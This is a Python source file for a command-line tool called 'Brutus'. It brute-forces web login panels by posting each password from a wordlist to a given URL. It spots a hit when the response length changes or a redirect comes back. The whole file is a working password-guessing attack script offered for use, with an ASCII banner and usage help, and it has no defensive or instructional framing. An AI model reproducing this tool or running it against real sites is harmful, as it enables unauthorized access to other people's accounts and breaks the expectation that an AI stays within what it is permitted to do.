import requests
import sys
import optparse

def title():
	print(''' \n
	BBBBBBBBBBBBBBBBB   RRRRRRRRRRRRRRRRR   UUUUUUUU     UUUUUUUUTTTTTTTTTTTTTTTTTTTTTTTUUUUUUUU     UUUUUUUU   SSSSSSSSSSSSSSS 
	B::::::::::::::::B  R::::::::::::::::R  U::::::U     U::::::UT:::::::::::::::::::::TU::::::U     U::::::U SS:::::::::::::::S
	B::::::BBBBBB:::::B R::::::RRRRRR:::::R U::::::U     U::::::UT:::::::::::::::::::::TU::::::U     U::::::US:::::SSSSSS::::::S
	BB:::::B     B:::::BRR:::::R     R:::::RUU:::::U     U:::::UUT:::::TT:::::::TT:::::TUU:::::U     U:::::UUS:::::S     SSSSSSS
	  B::::B     B:::::B  R::::R     R:::::R U:::::U     U:::::U TTTTTT  T:::::T  TTTTTT U:::::U     U:::::U S:::::S            
	  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T         U:::::D     D:::::U S:::::S            
	  B::::BBBBBB:::::B   R::::RRRRRR:::::R  U:::::D     D:::::U         T:::::T         U:::::D     D:::::U  S::::SSSS         
	  B:::::::::::::BB    R:::::::::::::RR   U:::::D     D:::::U         T:::::T         U:::::D     D:::::U   SS::::::SSSSS    
	  B::::BBBBBB:::::B   R::::RRRRRR:::::R  U:::::D     D:::::U         T:::::T         U:::::D     D:::::U     SSS::::::::SS  
	  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T         U:::::D     D:::::U        SSSSSS::::S 
	  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T         U:::::D     D:::::U             S:::::S
	  B::::B     B:::::B  R::::R     R:::::R U::::::U   U::::::U         T:::::T         U::::::U   U::::::U             S:::::S
	BB:::::BBBBBB::::::BRR:::::R     R:::::R U:::::::UUU:::::::U       TT:::::::TT       U:::::::UUU:::::::U SSSSSSS     S:::::S
	B:::::::::::::::::B R::::::R     R:::::R  UU:::::::::::::UU        T:::::::::T        UU:::::::::::::UU  S::::::SSSSSS:::::S
	B::::::::::::::::B  R::::::R     R:::::R    UU:::::::::UU          T:::::::::T          UU:::::::::UU    S:::::::::::::::SS 
	BBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR      UUUUUUUUU            TTTTTTTTTTT            UUUUUUUUU       SSSSSSSSSSSSSSS   
	                                                                                                                            
	By Bidon47

		''' )


def args():
	parser = optparse.OptionParser()
	parser.add_option("-u", "--url", dest="address", help="URL address of site, with login panel")
	parser.add_option("-l", "--loginFormName", dest="login_form_name", help="Name of login form from html")
	parser.add_option("-p", "--passwordFormName", dest="password_form_name", help="Name of password form from html")
	parser.add_option("-w", "--wordlist", dest="wordlist", help="Passwords dictionary file")
	(options,agruments) = parser.parse_args()


	address = options.address
	login_form_name = options.login_form_name
	password_form_name = options.password_form_name
	if None in (address, login_form_name, password_form_name):	
		print("[!] wrong args")
		print("Usage:\nbrutus.py -u <url> -l <login name in html form> -p <login name in html form> -w <wordlist>")
		sys.exit()
	try:
		f = open(options.wordlist, "r")
		wordlist = f.readlines()
		f.close()
	except:
		print("[!] Wrong wordlist file")
		sys.exit()

	return address, login_form_name, password_form_name, wordlist, options.wordlist



def startBrutus(address, login_form_name, password_form_name, wordlist, wordlist_dir):
	s = requests.Session()
	test_login = input("Input login: ")
	login_data = { login_form_name: test_login, password_form_name:"definetly_not_pasword" }
	default_len = len( s.post(address , data=login_data).content )

	print(f'''
		
		|######################################
		|Starting Brute force password cracking
		|######################################
		|URL:		{address}
		|Login:		{test_login}
		|Wordlist:	{wordlist_dir}
		''')

	i=0
	while(True):
		# print(f"Attempt {i+1}")
		# print(f"Trying: '{wordlist[i]}' ")
		login_data ={ login_form_name: test_login, password_form_name: wordlist[i]}
		

		response = s.post(address, data=login_data)
		# print(response.status_code)
		
		if len(response.content) != default_len or response.status_code==302:
			print(f"[*]Password found!\n Password: {wordlist[i]}")
			break
		if i == len(wordlist)-1:
			print("[*]Password not found. Try to use different wordlist")
			break
		i=i+1

if __name__ == "__main__":
	
	title()
	(address, login_form_name, password_form_name, wordlist, wordlist_dir) = args()
	startBrutus(address, login_form_name, password_form_name, wordlist, wordlist_dir)

